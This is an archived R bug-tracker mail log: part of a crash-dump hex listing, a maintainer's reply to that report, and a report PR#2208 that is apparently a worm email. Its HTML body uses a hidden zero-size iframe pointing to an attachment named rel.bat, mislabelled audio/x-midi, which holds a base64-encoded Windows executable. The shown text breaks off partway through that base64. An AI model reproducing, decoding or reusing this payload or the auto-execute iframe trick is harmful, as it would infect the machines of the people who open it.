12e2ff74  00 00 00 00 c0 b1 43 01 - c0 01 0c 86 48 02 0a 85  ......C.....H...
12e2ff84  00 02 00 00 00 00 00 00 - 68 e2 44 85 00 02 00 00  ........h.D.....
12e2ff94  e0 d2 0e 85 c0 b1 43 01 - 54 ff e2 12 77 0d 43 80  ......C.T...w.C.
12e2ffa4  dc ff e2 12 f4 28 00 1c - 38 12 00 1c ff ff ff ff  .....(..8.......
12e2ffb4  ec ff e2 12 8a 75 e8 77 - 00 00 00 00 3c 00 08 02  .....u.w....<...
12e2ffc4  00 00 00 00 00 00 00 00 - 00 a0 fd 7f 00 00 00 00  ................
12e2ffd4  c0 ff e2 12 00 00 00 00 - ff ff ff ff 5b 61 e8 77  ............[a.w
12e2ffe4  80 b5 e8 77 00 00 00 00 - 00 00 00 00 00 00 00 00  ...w............
12e2fff4  ca 26 00 1c 00 00 00 00 - 00 00 00 00 08 00 e3 12  .&..............
12e30004  00 00 00 00 10 00 e3 12 - 00 00 00 00 18 00 e3 12  ................
12e30014  00 00 00 00 20 00 e3 12 - 00 00 00 00 28 00 e3 12  .... .......(...
12e30024  00 00 00 00 30 00 e3 12 - 00 00 00 00 38 00 e3 12  ....0.......8...
12e30034  00 00 00 00 40 00 e3 12 - 00 00 00 00 48 00 e3 12  ....@.......H...
12e30044  00 00 00 00 50 00 e3 12 - 00 00 00 00 58 00 e3 12  ....P.......X...



==> 2207.followup.1 <==
From ripley@stats.ox.ac.uk  Thu Oct 24 11:05:55 2002
Received: from toucan.stats.ox.ac.uk (toucan.stats.ox.ac.uk [163.1.20.20])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id LAA27585
	for <R-bugs@biostat.ku.dk>; Thu, 24 Oct 2002 11:05:54 +0200 (MET DST)
From: ripley@stats.ox.ac.uk
Received: from gannet.stats (gannet.stats [163.1.20.127])
	by toucan.stats.ox.ac.uk (8.9.0/8.9.0) with ESMTP id KAA00887;
	Thu, 24 Oct 2002 10:05:06 +0100 (BST)
Date: Thu, 24 Oct 2002 10:05:06 +0100 (BST)
X-X-Sender:  <ripley@gannet.stats>
To: <rdarnell@shrs.uq.edu.au>
cc: <r-devel@stat.math.ethz.ch>, <R-bugs@biostat.ku.dk>
Subject: Re: crash report (PR#2207)
In-Reply-To: <200210240755.JAA25960@pubhealth.ku.dk>
Message-ID: <Pine.LNX.4.31.0210241003100.3978-100000@gannet.stats>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

All that log tells us is that it crashed in the graphics system.

There's nothing we can do unless you can send a reproducible report,
and even then it might not happen on our machines.

-- 
Brian D. Ripley,                  ripley@stats.ox.ac.uk
Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
University of Oxford,             Tel:  +44 1865 272861 (self)
1 South Parks Road,                     +44 1865 272860 (secr)
Oxford OX1 3TG, UK                Fax:  +44 1865 272595

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2208 *
Subject: Contents
From: synapse <synapse@snapweb.com>
Date: Thu, 24 Oct 2002 04:19:59 -0500
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2208 <==
From synapse@verizon.net  Thu Oct 24 11:21:19 2002
Received: from franz.stat.wisc.edu (mail@www.omegahat.org [128.105.174.32])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id LAA27862
	for <r-bugs@biostat.ku.dk>; Thu, 24 Oct 2002 11:21:15 +0200 (MET DST)
Received: from out010pub.verizon.net ([206.46.170.133] helo=out010.verizon.net)
	by franz.stat.wisc.edu with esmtp (Exim 3.35 #1 (Debian))
	id 184eAL-000841-00
	for <r-bugs@r-project.org>; Thu, 24 Oct 2002 04:20:33 -0500
Received: from Him ([134.174.1.17]) by out010.verizon.net
          (InterMail vM.5.01.05.09 201-253-122-126-109-20020611) with SMTP
          id <20021024091959.MHLY11125.out010.verizon.net@Him>
          for <r-bugs@r-project.org>; Thu, 24 Oct 2002 04:19:59 -0500
From: synapse <synapse@snapweb.com>
To: r-bugs@r-project.org
Subject: Contents
MIME-Version: 1.0
Content-Type: multipart/alternative;
	boundary=G31P0gYZ4m15H6R
Message-Id: <20021024091959.MHLY11125.out010.verizon.net@Him>
Date: Thu, 24 Oct 2002 04:19:59 -0500

--G31P0gYZ4m15H6R
Content-Type: text/html;
Content-Transfer-Encoding: quoted-printable

<HTML><HEAD></HEAD><BODY>
<iframe src=3Dcid:A16B2O8Ml953j9945 height=3D0 width=3D0>
</iframe>
<FONT></FONT></BODY></HTML>

--G31P0gYZ4m15H6R
Content-Type: audio/x-midi;
	name=rel.bat
Content-Transfer-Encoding: base64
Content-ID: <A16B2O8Ml953j9945>

TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAA2AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4g
RE9TIG1vZGUuDQ0KJAAAAAAAAAAYmX3gXPgTs1z4E7Nc+BOzJ+Qfs1j4E7Pf5B2zT/gTs7Tn
GbNm+BOzPucAs1X4E7Nc+BKzJfgTs7TnGLNO+BOz5P4Vs134E7NSaWNoXPgTswAAAAAAAAAA
UEUAAEwBBAC4jrc8AAAAAAAAAADgAA8BCwEGAADAAAAAkAgAAAAAAFiEAAAAEAAAANAAAAAA
QAAAEAAAABAAAAQAAAAAAAAABAAAAAAAAAAAYAkAABAAAAAAAAACAAAAAAAQAAAQAAAAABAA
ABAAAAAAAAAQAAAAAAAAAAAAAAAg1gAAZAAAAABQCQAQAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
ANAAAOwBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAudGV4dAAAAEq6AAAAEAAAAMAAAAAQ
AAAAAAAAAAAAAAAAAAAgAABgLnJkYXRhAAAiEAAAANAAAAAgAAAA0AAAAAAAAAAAAAAAAAAA
QAAAQC5kYXRhAAAAbF4IAADwAAAAUAAAAPAAAAAAAAAAAAAAAAAAAEAAAMAucnNyYwAAABAA
AAAAUAkAEAAAAABAAQAAAAAAAAAAAAAAAABAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
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
